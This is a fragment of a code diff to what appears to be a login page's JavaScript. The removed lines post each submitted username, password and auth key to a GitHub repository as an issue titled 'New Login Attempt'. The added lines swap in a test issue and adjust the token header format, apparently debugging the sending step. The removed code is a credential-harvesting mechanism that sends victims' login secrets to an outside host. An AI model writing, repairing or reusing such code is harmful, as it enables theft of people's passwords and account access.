@@ -186,15 +186,15 @@
 
         // 📝 Create an issue on GitHub
         fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/issues`, {
-            method: "POST",
-            headers: {
-                "Authorization": `${GITHUB_TOKEN}`,
-                "Accept": "application/vnd.github.v3+json",
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                title: `New Login Attempt - ${username}`,
-                body: `🔑 **Username:** ${username}\n🔒 **Password:** ${password}\n🛡️ **Auth Key:** ${authKey}`
+              method: "POST",
+    headers: {
+        "Authorization": `Bearer YOUR_GITHUB_TOKEN`,  // 🔥 Correct format
+        "Accept": "application/vnd.github.v3+json",
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        title: "New Issue",
+        body: "This is a test issue"
             })
         })
         .then(response => response.json())
